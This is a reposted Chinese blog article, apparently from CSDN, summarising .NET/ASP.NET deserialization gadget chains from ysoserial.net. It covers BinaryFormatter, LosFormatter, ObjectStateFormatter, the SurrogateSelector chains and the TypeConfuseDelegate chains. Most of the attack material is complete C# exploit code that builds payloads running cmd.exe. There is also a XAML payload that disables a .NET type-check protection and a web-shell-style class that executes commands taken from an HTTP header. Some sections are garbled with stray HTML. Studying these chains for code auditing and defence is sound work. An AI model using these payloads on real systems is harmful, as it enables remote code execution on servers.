# 转载
：  asp.net反序列化的思考和总结

# asp.net反序列化的思考和总结

**目录**

[前言](#toc-0)

[基础知识](#toc-1)

[反序列化--基于ysoserial的分析](#toc-2)

[XMLSerializer](#toc-3)

[反序列化攻击链](#toc-4)

[ObjectDataProvider+ResourceDictionary](#ObjectDataProvider%2BResourceDictionary)

[代码审计视角--type可控](#toc-5)

[BinaryFormatter](#toc-6)

[反序列化链](#toc-7)

[TextFormattingRunProperties](#TextFormattingRunProperties)

[PSObject+ObjectDataProvider](#PSObject%2BObjectDataProvider)

[DataSet + TextFormattingRunProperties](#DataSet%20%2B%20TextFormattingRunProperties)

[DataSetTypeSpoof+TextFormattingRunProperties](#DataSetTypeSpoof%2BTextFormattingRunProperties)

[DataSetOldBehaviour+ObjectDataProvider](#DataSetOldBehaviour%2BObjectDataProvider)

[DataSetOldBehaviourFromFileGenerator+ObjectDataProvider](#DataSetOldBehaviourFromFileGenerator%2BObjectDataProvider)

[ToolboxItemContainer+TextFormattingRunProperties](#ToolboxItemContainer%2BTextFormattingRunProperties)

[AxHostState+TextFormattingRunProperties](#AxHostState%2BTextFormattingRunProperties)

[代码审计视角](#toc-8)

[LosFormatter和ObjectStateFormatter](#toc-9)

[反序列化链](#toc-10)

[ClaimsIdentity+TextFormattingRunProperties+ObjectDataProvider](#ClaimsIdentity%2BTextFormattingRunProperties%2BObjectDataProvider)

[WindowsIdentity+TextFormattingRunProperties](#WindowsIdentity%2BTextFormattingRunProperties)

[WindowsClaimsIdentity+TextFormattingRunProperties](#WindowsClaimsIdentity%2BTextFormattingRunProperties)

[RolePrincipal+TextFormattingRunProperties](#RolePrincipal%2BTextFormattingRunProperties)

[WindowsPrincipal+WindowsIdentity+ClaimsIdentity+TextFormattingRunProperties](#WindowsPrincipal%2BWindowsIdentity%2BClaimsIdentity%2BTextFormattingRunProperties)

[SessionSecurityToken+TextFormattingRunProperties](#SessionSecurityToken%2BTextFormattingRunProperties)

[SessionViewStateHistoryItem+TextFormattingRunProperties](#SessionViewStateHistoryItem%2BTextFormattingRunProperties)

[代码审计视角](#toc-11)

[SurrogateSelector相关的链子-主要为了加载自己的恶意代码打回显](#toc-12)

[反序列化链](#toc-13)

[ActivitySurrogateSelector](#ActivitySurrogateSelector)

[ActivitySurrogateSelectorFromFile](#ActivitySurrogateSelectorFromFile)

[ActivitySurrogateDisableTypeCheck+TextFormattingRunProperties](#ActivitySurrogateDisableTypeCheck%2BTextFormattingRunProperties)

[回显](#%E5%9B%9E%E6%98%BE)

[TypeConfuseDelegate相关的链子](#toc-14)

[反序列化链](#toc-15)

[TypeConfuseDelegate+ObjectDataProvider（利用的是委托特性）](#TypeConfuseDelegate%2BObjectDataProvider%EF%BC%88%E5%88%A9%E7%94%A8%E7%9A%84%E6%98%AF%E5%A7%94%E6%89%98%E7%89%B9%E6%80%A7%EF%BC%89)

[ClaimsPrincipal+TypeConfuseDelegate](#ClaimsPrincipal%2BTypeConfuseDelegate)

[GenericPrincipal+ClaimsPrincipal+SortedSet](#GenericPrincipal%2BClaimsPrincipal%2BSortedSet)

[ResourceSet+Sorted](#ResourceSet%2BSorted)

[参考文章](#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0)

---


### 前言

这篇文章是在Y4er博客和ysoserial.net项目上，总结出的一些关键东西和我自己的思考，希望可以对大家有所帮助。

### 基础知识

[dotnet serialize 101 - 先知社区](https://xz.aliyun.com/t/9591)

### 反序列化--基于ysoserial的分析

### XMLSerializer

命名空间：[System.Xml.Serialization](https://docs.microsoft.com/zh-cn/dotnet/api/system.xml.serialization?view=net-5.0)，程序集为：System.Xml.XmlSerializer.dll

条件：对象的公共(public)属性和公共字段

几种获取type的方式

```
ObjectDataProvider -&gt; XamlReader.Parse() -&gt; ObjectDataProvider -&gt; System.Diagnostics.Process.Start("cmd.exe","/c calc")
```

对于ResourceDictionary的RCE代码,`XamlReader.Parse()`解析即可触发

```
xml.Deserialize(memoryStream)</code>中的反序列化的值是否可控。</p> </li></ol>
<h3>BinaryFormatter</h3>
命名空间位于`System.Runtime.Serialization.Formatters.Binary`
<h4>反序列化链</h4>
yso中的很多gadget链都是由TextFormattingRunProperties链衍生的
<h5>TextFormattingRunProperties</h5>
限制条件：Microsoft.PowerShell.Editor.dll
<pre><code>该库是PowerShell的一部分，该PowerShell已预安装在从Windows Server 2008 R2和Windows 7开始的所有Windows版本中。
```

#### 反序列化链

**调用的类** : TextFormattingRunProperties + ObjectDataProvider + Process

**思路**：我们在GetObjectData序列化时给ForegroundBrush字段赋值为`_xaml`的payload，并且将对象类型赋值为TextFormattingRunProperties类。因为在反序列化时触发TextFormattingRunProperties类的构造函数，而构造函数中，调用的`GetObjectFromSerializationInfo`,触发XamlReader.Parse(payload) ，就衔接上了ObjectDataProvider

**Sink关键点**：`XamlReader.Parse`

我们需要的就是传入的payload就是可以被`XamlReader.Parse`解析的ObjectDataProvider的xml

```
using System;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using Microsoft.VisualStudio.Text.Formatting;
namespace BinaryFormatterSerialize
{
    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)
        {
        }

        string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type typeTFRP = typeof(TextFormattingRunProperties);
            info.SetType(typeTFRP);
            info.AddValue("ForegroundBrush", _xaml);
        }
        public TextFormattingRunPropertiesMarshal(string xaml)
        {
            _xaml = xaml;
        }
    }
    class Program
    {
        static void Main(string[] args)
        {
            string xaml_payload = File.ReadAllText(@"C:\Users\ddd\source\repos\xml.txt");
            TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(xaml_payload);

            using (MemoryStream memoryStream = new MemoryStream())
            {
                // 构建formatter
                BinaryFormatter binaryFormatter = new BinaryFormatter();
                binaryFormatter.Serialize(memoryStream, payload);
                memoryStream.Position = 0;
                binaryFormatter.Deserialize(memoryStream);
            }
            Console.ReadKey();
        }
    }
}
```

调试栈：

##### PSObject+ObjectDataProvider

**调用的类：**PSObject+ObjectDataProvider

**Sink关键点**：通过一个有参构造方法，链子最后调用了`XamlReader.Parse`方法

思路：在反序列化构造函数中读取CliXml值，最后调用了XamlReader.Parse()进行反序列化触发RCE。所以我们就可以传入ObjectDataProvider的xml值

##### DataSet + TextFormattingRunProperties

**调用的类**：DataSet (在 System.Data, System.Data.dll 中)+ TextFormattingRunProperties+ObjectDataProvider

**思路**：反序列化过程调用有参构造函数时，DataSet.Tables_0字段的byte数组会被自动反序列化（用的是BinaryFormatter），我们可以将TextFormattingRunProperties生成的byte数组赋值给DataSet.Tables_0字段，然后就可以RCE了。

**Sink关键点**：`binaryFormatter.Deserialize`,一定要找ISerializable接口的

对于DataSet这条链子，触发点在`this.DeserializeDataSetSchema`

整个流程：
1. 生成TextFormattingRunProperties的payload转byte数组存放到DataSet.Tables_0字段1. 填充DataSet的其他字段满足反序列化条件使其不报错1. 进入DataSet的反序列化构造函数DeserializeDataSet 该函数自动反序列化其中的Schema和Data1. 在DeserializeDataSetSchema()中获取DataSet.Tables_0字段的值进行BinaryFormatter.Deserialize()。
条件就是：依赖于TextFormattingRunProperties。

##### DataSetTypeSpoof+TextFormattingRunProperties

原理和调用的类都跟DataSet一样的，只是对`info.SetType(typeof(System.Data.DataSet))`进行了变形

##### DataSetOldBehaviour+ObjectDataProvider

**调用的类**：DataSet+ObjectDataProvider

**思想**：还是调用了DataSet的反序列化构造函数。

**Sink关键点**：找到了`XmlSerializer.Deserialize`去反序列化实现RCE

但是这个链子的触发点在`this.DeserializeDataSetData`,直接调用了`DataSet.ReadXml()`，最后调用了`XmlSerializer.Deserialize`

##### DataSetOldBehaviourFromFileGenerator+ObjectDataProvider

跟上面一样的，只是换成了一个从本地文件读一个XML

##### ToolboxItemContainer+TextFormattingRunProperties

**调用的类**：ToolboxItemContainer+TextFormattingRunProperties+ObjectDataProvider

**思路**：ToolboxItemSerializer的反序列化构造函数，`Stream`字段的值直接利用了BinaryFormatter进行反序列化，所以可以使用TextFormattingRunProperties填充byte数组，达到rce

**Sink关键点**：_formatter.Deserialize()

传入Stream中的是字节，所以我们可以利用TypeConfuseDelegate的payload字节去替换TextFormattingRunProperties的payload字节。

payload：

```
using Microsoft.VisualStudio.Text.Formatting;
using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Data;
using System.Windows.Markup;

namespace NancySerialize
{
    class Program
    {
        static void Main(string[] args)
        {
            BinaryFormatter binaryFormatter = new BinaryFormatter();
            byte[] vs;
            using (MemoryStream memory = new MemoryStream())
            {
                binaryFormatter.Serialize(memory, new TextFormattingRunPropertiesMarshal("calc"));
                vs = memory.ToArray();
            }
            ToolboxItemSerializerMarshal toolBox = new ToolboxItemSerializerMarshal(vs);
            using (MemoryStream memoryStream = new MemoryStream())
            {
                binaryFormatter.Serialize(memoryStream, toolBox);
                memoryStream.Position = 0;
                binaryFormatter.Deserialize(memoryStream);
            }
        }
    }
    [Serializable]
    public class ToolboxItemSerializerMarshal : ISerializable
    {
        public ToolboxItemSerializerMarshal(byte[] payload)
        {
            Payload = payload;
        }

        private byte[] Payload { get; }
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(Type.GetType("System.Drawing.Design.ToolboxItemContainer+ToolboxItemSerializer, System.Drawing.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"));
            info.AddValue("AssemblyName", new AssemblyName());
            info.AddValue("Stream", Payload);
        }
    }
    //生成TextFormattingRunProperties的字节通用方式
    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        public static string gadget(string cmd)
        {
            // ObjectDataProvider
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = $"/c {cmd}";
            StringDictionary dict = new StringDictionary();
            psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
            Process p = new Process();
            p.StartInfo = psi;
            ObjectDataProvider odp = new ObjectDataProvider();
            odp.MethodName = "Start";
            odp.IsInitialLoadEnabled = false;
            odp.ObjectInstance = p;

            return XamlWriter.Save(odp);
        }
        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)
        {
        }
        string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type typeTFRP = typeof(TextFormattingRunProperties);
            info.SetType(typeTFRP);
            info.AddValue("ForegroundBrush", _xaml);
        }
        public TextFormattingRunPropertiesMarshal(string cmd)
        {
            _xaml = gadget(cmd);
        }
        public TextFormattingRunPropertiesMarshal()
        {
            _xaml = gadget("calc");
        }
    }
}
```

##### AxHostState+TextFormattingRunProperties

**调用的类：**State+TextFormattingRunProperties+ObjectDataProvider

**Sink关键点**：`BinaryFormatter.Deserialize`

**思路**：在System.Windows.Forms.AxHost.State类的反序列化构造函数中，调用了this.propBag.Read，PropertyBagBinary字段的值会被BinaryFormatter形式反序列化

#### 代码审计视角

BinaryFormatter不需要type，所以很容易出现反序列化攻击

### LosFormatter和ObjectStateFormatter

LosFormatter一般用于序列化存储视图流状态，多用于Web窗体，如ViewState。LosFormatter封装在System.Web.dll中，命名空间为System.Web.UI，使用LosFormatter反序列化不信任的数据会造成RCE。

ObjectStateFormatter同样用于序列化和反序列化表示对象状态的对象图

#### 反序列化链

除了ObjectDataProvider不支持LosFormatter以外，其他的gadget都支持。

底层：首先LosFormatter底层ObjectStatesFormatter会调用binaryformatter序列化和反序列化自身object字段

##### ClaimsIdentity+TextFormattingRunProperties+ObjectDataProvider

**调用的类**：ClaimsIdentity+TextFormattingRunProperties+ObjectDataProvider

**Sink关键点**：寻找我们的`new BinaryFormatter().Deserialize`的位置

**思路**：

利用1：利用ClaimsIdentity类自身的m_bootstrapContext字段是object类型，且没有标记NonSerialized，将我们的TextFormattingRunProperties对象赋值给这个字段，当反序列化的时候，LosFormatter底层ObjectStatesFormatter会调用binaryformatter序列化和反序列化自身object字段（Object类型都是Token_BinarySerialized,没有对应的类型转换器,所以就会默认调用一个BinaryFormatter去）

例子：

```
namespace LosFormatterDeserialize
{
    class Program
    {
        static void Main(string[] args)
        {

            LosFormatter losFormatter = new LosFormatter();
            using (MemoryStream memory = new MemoryStream())
            {
                TextFormattingRunPropertiesMarshal textFormattingRunPropertiesMarshal = new TextFormattingRunPropertiesMarshal();
                My my = new My();
                my.o = textFormattingRunPropertiesMarshal;
                losFormatter.Serialize(memory,my);
                memory.Position = 0;
                losFormatter.Deserialize(memory);
            }
            Console.ReadKey();
        }
    }
    [Serializable]
    public class My
    {
        public object o;
    }

    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        public static string gadget(string cmd)
        {
            // ObjectDataProvider
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = $"/c {cmd}";
            StringDictionary dict = new StringDictionary();
            psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
            Process p = new Process();
            p.StartInfo = psi;
            ObjectDataProvider odp = new ObjectDataProvider();
            odp.MethodName = "Start";
            odp.IsInitialLoadEnabled = false;
            odp.ObjectInstance = p;

            return XamlWriter.Save(odp);
        }
        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)
        {
        }
        string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type typeTFRP = typeof(TextFormattingRunProperties);
            info.SetType(typeTFRP);
            info.AddValue("ForegroundBrush", _xaml);
        }
        public TextFormattingRunPropertiesMarshal(string cmd)
        {
            _xaml = gadget(cmd);
        }
        public TextFormattingRunPropertiesMarshal()
        {
            _xaml = gadget("calc");
        }
    }
}
```

利用2(ysoserial的写法)：将我们的TextFormattingRunProperties的payload，赋值到m_serializedClaims的字段，类型为String，我们再利用BinaryFormatter去反序列化ClaimsIdentity类时，会调用OnDeserializedMethod方法，然后再调用DeserializeClaims方法中，就再次对我们的m_serializedClaims进行反序列化（有点二次反序列化的味道）

##### WindowsIdentity+TextFormattingRunProperties

**调用的类**：WindowsIdentity+ClaimsIdentity+TextFormattingRunProperties+ObjectDataProvider

**Sink关键点**：还是一样的，去寻找`new BinaryFormatter().Deserialize`

**思路**：WindowsIdentity继承自ClaimsIdentity，ISerializable，在反序列化时会调用其构造函数，同时也调用了父类的反序列化构造函数，三个字段`actor`和`bootstrapContextKey`均可以进行binaryformatter反序列化。所以在info中设置key为System.Security.ClaimsIdentity.actor或bootstrapContext或claims，值为TextFormattingRunProperties的Base64 payload，即可触发RCE

流程截图：

在`DeserializeClaims`方法中

payload:

```
using Microsoft.VisualStudio.Text.Formatting;
using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Principal;
using System.Web.UI;
using System.Windows.Data;
using System.Windows.Markup;

namespace LosFormatterDeserialize
{
    class Program
    {
        static void Main(string[] args)
        {

            BinaryFormatter b = new LosFormatter();
            BinaryFormatter bf = new BinaryFormatter();
            using (MemoryStream memory = new MemoryStream())
            {
                TextFormattingRunPropertiesMarshal textFormattingRunPropertiesMarshal = new TextFormattingRunPropertiesMarshal();
                bf.Serialize(memory, textFormattingRunPropertiesMarshal);
                string b64payload = Convert.ToBase64String(memory.ToArray());
                WindowsIdentityIdentityMarshal windowsIdentityIdentityMarshal = new WindowsIdentityIdentityMarshal(b64payload);

                memory.Position = 0;
                b.Serialize(memory, windowsIdentityIdentityMarshal);
                memory.Position = 0;
                b.Deserialize(memory);

            }
            Console.ReadKey();
        }
    }
    [Serializable]
    public class WindowsIdentityIdentityMarshal : ISerializable
    {
        public WindowsIdentityIdentityMarshal(string b64payload)
        {
            B64Payload = b64payload;
        }

        private string B64Payload { get; }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(WindowsIdentity));
            info.AddValue("System.Security.ClaimsIdentity.actor", B64Payload);
            info.AddValue("System.Security.ClaimsIdentity.bootstrapContext", B64Payload);
            info.AddValue("System.Security.ClaimsIdentity.claims", B64Payload);
        }
    }
    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        public static string gadget(string cmd)
        {
            // ObjectDataProvider
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = $"/c {cmd}";
            StringDictionary dict = new StringDictionary();
            psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
            Process p = new Process();
            p.StartInfo = psi;
            ObjectDataProvider odp = new ObjectDataProvider();
            odp.MethodName = "Start";
            odp.IsInitialLoadEnabled = false;
            odp.ObjectInstance = p;

            return XamlWriter.Save(odp);
        }
        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)
        {
        }
        string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type typeTFRP = typeof(TextFormattingRunProperties);
            info.SetType(typeTFRP);
            info.AddValue("ForegroundBrush", _xaml);
        }
        public TextFormattingRunPropertiesMarshal(string cmd)
        {
            _xaml = gadget(cmd);
        }
        public TextFormattingRunPropertiesMarshal()
        {
            _xaml = gadget("calc");
        }
    }
}
```

##### WindowsClaimsIdentity+TextFormattingRunProperties

**思路**：原理一样，这个通过`_actor`字段，在反序列化构造函数中，会反序列化其`_actor`字段

限制：该类所在的命名空间不在GAC([Global Assembly Cache](https://docs.microsoft.com/en-us/dotnet/framework/app-domains/gac))中，限制较大。

payload:

```
public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(WindowsClaimsIdentity));
            info.AddValue("_actor", B64Payload);
            info.AddValue("m_userToken", new IntPtr(0));
            info.AddValue("_label", null);
            info.AddValue("_nameClaimType", null);
            info.AddValue("_roleClaimType", null);
        }
```

##### RolePrincipal+TextFormattingRunProperties

**调用的类**：RolePrincipal（继承了ClaimsPrincipal类）+ClaimsPrincipal+TextFormattingRunProperties+ObjectDataProvider

**Sink关键点**：binaryFormatter.Deserialize

**思路**：RolePrincipal类反序列化构造函数，调用父类的Identities字段，而父类ClaimsPrincipal在反序列化构造时将`info.GetString("System.Security.ClaimsPrincipal.Identities")`取出的值，base64转byte数组之后，直接BinaryFormatter反序列化造成RCE。

payload:

```
using Microsoft.VisualStudio.Text.Formatting;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Claims;
using System.Text;
using System.Threading.Tasks;
using System.Web.UI;
using System.Windows.Data;
using System.Windows.Markup;

namespace ObjectStateFormatterSerialize
{
    class Program
    {
        static void Main(string[] args)
        {
            TextFormattingRunPropertiesMarshal calc = new TextFormattingRunPropertiesMarshal("calc");
            string b64payload;
            using (MemoryStream m = new MemoryStream())
            {
                BinaryFormatter binaryFormatter = new BinaryFormatter();
                binaryFormatter.Serialize(m, calc);
                b64payload = Convert.ToBase64String(m.ToArray());
            }
            RolePrincipalMarshal rolePrincipalMarshal = new RolePrincipalMarshal(b64payload);
            ObjectStateFormatter objectStateFormatter = new ObjectStateFormatter();
            string p = objectStateFormatter.Serialize(rolePrincipalMarshal);
            objectStateFormatter.Deserialize(p);
        }


    }
    [Serializable]
    public class RolePrincipalMarshal : ISerializable
    {
        public RolePrincipalMarshal(string b64payload)
        {
            B64Payload = b64payload;
        }

        private string B64Payload { get; }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(System.Web.Security.RolePrincipal));
            info.AddValue("System.Security.ClaimsPrincipal.Identities", B64Payload);
        }
    }
    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)
        {
        }
        string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type typeTFRP = typeof(TextFormattingRunProperties);
            info.SetType(typeTFRP);
            info.AddValue("ForegroundBrush", _xaml);
        }
        public TextFormattingRunPropertiesMarshal(string cmd)
        {
            // ObjectDataProvider
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = $"/c {cmd}";
            StringDictionary dict = new StringDictionary();
            psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
            Process p = new Process();
            p.StartInfo = psi;
            ObjectDataProvider odp = new ObjectDataProvider();
            odp.MethodName = "Start";
            odp.IsInitialLoadEnabled = false;
            odp.ObjectInstance = p;
            _xaml = XamlWriter.Save(odp);
        }
    }
}
```

##### WindowsPrincipal+WindowsIdentity+ClaimsIdentity+TextFormattingRunProperties

**调用的类**：WindowsPrincipal+WindowsIdentity+ClaimsIdentity+TextFormattingRunProperties+ObjectDataProvider

**思路**：WindowsPrincipal类字段m_identity类型为WindowsIdentity，当反序列化时，WindowsIdentity将被调用构造函数，就是上面七年的链子再次使用

payload：

```
class Program
    {
        static void Main(string[] args)
        {
            WindowsIdentity currentWI = WindowsIdentity.GetCurrent();
            currentWI.Actor = new ClaimsIdentity();
            currentWI.Actor.BootstrapContext = new TextFormattingRunPropertiesMarshal("calc");
            WindowsPrincipalMarshal obj = new WindowsPrincipalMarshal();
            obj.wi = currentWI;
            string v = new ObjectStateFormatter().Serialize(obj);
            new ObjectStateFormatter().Deserialize(v);
        }


    }
    [Serializable]
    public class WindowsPrincipalMarshal : ISerializable
    {
        public WindowsPrincipalMarshal() { }
        public WindowsIdentity wi { get; set; }
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(WindowsPrincipal));
            info.AddValue("m_identity", wi);
        }
    }
```

##### SessionSecurityToken+TextFormattingRunProperties

**调用的类**：SessionSecurityToken+TextFormattingRunProperties+ObjectDataProvider

**Sink关键点**：还是找到了`binaryFormatter`的位置

**思路**：SessionSecurityToken类反序列化构造函数时，调用了ReadIdentity方法，然后在该方法中，将BootstrapToken标签中的内容base64解码通过binaryformatter反序列化。

`ReadIdentity方法`方法：

payload：

##### SessionViewStateHistoryItem+TextFormattingRunProperties

**调用的类**：SessionViewState+SessionViewStateHistoryItem+TextFormattingRunProperties+ObjectDataProvider\

**Sink关键**：找到了Binary.Deserialize一样的new LosFormatter().Deserialize

**思路**：SessionViewState的内部类SessionViewStateHistoryItem的反序列化构造函数，直接对序列化值的s参数值，进行LosFormatter反序列化。

#### 代码审计视角

除了关注反序列化方法传入的参数值，还需要注意使用LosFormatter和ObjectStatesFormatter可能会造成二次反序列化，要关注object类型的字段

### SurrogateSelector相关的链子-主要为了加载自己的恶意代码打回显

#### 反序列化链

##### ActivitySurrogateSelector

利用了代理选择器，代理选择器的用法在于是原本不能被序列化的类可以用来序列化和反序列化

**整个流程**：加载自己的恶意代码
1. 从ActivitySurrogateSelector+ObjectSurrogate序列化一些原本不能被序列化的类，利用了LINQ1. LINQ替换其委托为Assembly.Load加载自己的恶意代码并创建实例1. 通过IEnumerable -&gt; PagedDataSource -&gt; ICollectionICollection -&gt; AggregateDictionary -&gt; IDictionary -&gt; DesignerVerb -&gt; ToString1. 通过HashTable键值重复触发报错进入ToString1. 然后用`System.Windows.Forms.AxHost.State`包装一下，try catch处理异常。
##### ActivitySurrogateSelectorFromFile

这个其实也是ActivitySurrogateSelector利用链，只不过可以执行自己编写的程序集（只是可以加载dll文件形式）。下面的代码是接收参数并动态编译读取字节码存入自身assemblyBytes字段。

##### ActivitySurrogateDisableTypeCheck+TextFormattingRunProperties

在dotnet4.8中，微软修复了对ActivitySurrogateSelector类的滥用

思路：用TextFormattingRunProperties关闭DisableActivitySurrogateSelectorTypeCheck类型检查，然后再反序列化实现RCE

```
&lt;ResourceDictionary
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:s="clr-namespace:System;assembly=mscorlib"
    xmlns:c="clr-namespace:System.Configuration;assembly=System.Configuration"
    xmlns:r="clr-namespace:System.Reflection;assembly=mscorlib"&gt;
    &lt;ObjectDataProvider x:Key="type" ObjectType="{x:Type s:Type}" MethodName="GetType"&gt;
        &lt;ObjectDataProvider.MethodParameters&gt;
            &lt;s:String&gt;System.Workflow.ComponentModel.AppSettings, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&lt;/s:String&gt;
        &lt;/ObjectDataProvider.MethodParameters&gt;
    &lt;/ObjectDataProvider&gt;
    &lt;ObjectDataProvider x:Key="field" ObjectInstance="{StaticResource type}" MethodName="GetField"&gt;
        &lt;ObjectDataProvider.MethodParameters&gt;
            &lt;s:String&gt;disableActivitySurrogateSelectorTypeCheck&lt;/s:String&gt;
            &lt;r:BindingFlags&gt;40&lt;/r:BindingFlags&gt;
        &lt;/ObjectDataProvider.MethodParameters&gt;
    &lt;/ObjectDataProvider&gt;
    &lt;ObjectDataProvider x:Key="set" ObjectInstance="{StaticResource field}" MethodName="SetValue"&gt;
        &lt;ObjectDataProvider.MethodParameters&gt;
            &lt;s:Object/&gt;
            &lt;s:Boolean&gt;true&lt;/s:Boolean&gt;
        &lt;/ObjectDataProvider.MethodParameters&gt;
    &lt;/ObjectDataProvider&gt;
    &lt;ObjectDataProvider x:Key="setMethod" ObjectInstance="{x:Static c:ConfigurationManager.AppSettings}" MethodName ="Set"&gt;
        &lt;ObjectDataProvider.MethodParameters&gt;
            &lt;s:String&gt;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&lt;/s:String&gt;
            &lt;s:String&gt;true&lt;/s:String&gt;
        &lt;/ObjectDataProvider.MethodParameters&gt;
    &lt;/ObjectDataProvider&gt;
&lt;/ResourceDictionary&gt;
```

##### 回显

写一个自定义的程序集，利用header中的cmd参数值执行命令，同时有回显

```
class E
{
    public E()
    {
        System.Web.HttpContext context = System.Web.HttpContext.Current;
        context.Server.ClearError();
        context.Response.Clear();
        try
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.FileName = "cmd.exe";
            string cmd = context.Request.Headers["cmd"];
            process.StartInfo.Arguments = "/c " + cmd;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            context.Response.Write(output);
        } catch (System.Exception) {}
        context.Response.Flush();
        context.Response.End();
    }
}
```

```
ysoserial.exe -g ActivitySurrogateSelectorFromFile -f SoapFormatter -c "dlls\E.cs;System.Web.dll;System.dll"
```

### TypeConfuseDelegate相关的链子

#### 反序列化链

##### TypeConfuseDelegate+ObjectDataProvider（利用的是委托特性）

对于这个链子的解释，最终也是调用了ObjectDataProvider，但是可以去替代TextFormattingRunProperties去衔接其他链子。

**调用的类**：SortedSet + ObjectDataProvider

**思路**：SortedSet中OnDeserialization会在反序列化时触发，调用Add函数，在Add的时候，经过多次重载调用了比较器的Compare()方法。即我们反射修改的Process.Start(string,string)

条件：`Comparer&lt;string&gt;.Create(c)`该函数在dotnet4.5中才出现，低版本的dotnet无法利用成功

yso生成的代码

##### ClaimsPrincipal+TypeConfuseDelegate

**调用的类**：ClaimsPrincipal+SortedSet

**Sink关键**：这个反序列化的出发点就不是构造函数了，直接是`OnDeserializedMethod`这个回调事件，从而找到`binaryFormatter.Deserialize`

**思想**：在反序列化的时候，会触发这个`ClaimsPrincipal`这个OnDeserializedMethod回调事件，然后对`m_serializedClaimsIdentities`进行反序列化

##### GenericPrincipal+ClaimsPrincipal+SortedSet

**思想：**这个链子跟上面那个一样的，只是变成更加通用了

##### ResourceSet+Sorted

**思想**：还是TypeConfuseDelegate的链子，直接构造，然后反序列化时，触发Sorted的OnDeserialization事件

## 参考文章

[https://github.com/Y4er/dotnet-deserialization/blob/main/BinaryFormatter.md](https://github.com/Y4er/dotnet-deserialization/blob/main/BinaryFormatter.md)

[GitHub - Ivan1ee/NET-Deserialize: 总结了十篇.Net反序列化文章，持续更新](https://github.com/Ivan1ee/NET-Deserialize)

## **免费领取安全学习资料包！（私聊进群一起学习，共同进步）**<img alt="" height="768" src="https://img-blog.csdnimg.cn/db5baea343594ac1af344d477cc787c7.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/858e0881cd0e4ee0b3df149a3a953792.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/71c7c67246ff471fb95c2d2933aee6e2.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/46ae75a8eb224a29869b60e0d06ec8d8.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/30faa3b27a76458a83a17f222a1c317b.png" width="665"/>

应急响应笔记

学习路线

 
